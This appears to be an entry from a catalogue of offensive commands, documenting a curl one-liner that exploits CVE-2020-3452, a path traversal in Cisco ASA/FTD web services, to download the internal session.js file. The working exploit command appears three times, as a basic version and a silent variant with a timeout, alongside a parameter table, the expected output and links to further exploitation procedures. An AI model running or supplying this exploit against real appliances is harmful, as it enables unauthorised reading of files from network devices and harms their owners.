---
id: cmd-curl-session-js
data: >-
  curl -k
  "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../"
  --output session.js
tags:
  - path-traversal
  - http-get
  - file-download
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.391Z'
verified: false
validated: true
submitted: true
---
# curl-download-session-js

## Command

```bash
curl -k "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

## Description

This command performs path traversal exploitation (CVE-2020-3452) to download the internal session.js file from Cisco ASA/FTD web services using curl.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure mode: skips SSL certificate verification | Yes (for self-signed certs) |
| `--output` | Specifies output file name (session.js) | Yes |
| URL (full) | Crafted endpoint with traversal in 'lang=../' and textdomain targeting file | Yes |

## Examples

### Basic Usage

```bash
curl -k "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

### Advanced Usage

With silent mode and timeout:

```bash
curl -k -s --max-time 30 "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

## Expected Output

Response body saved to 'session.js' with JavaScript code. Verify with HTTP 200 and file inspection for session-related functions.

## Related

- [[commands/curl-download-portal-inc-lua]]
- [[procedures/Command-Line-Path-Traversal-Exploitation-with-Curl]]
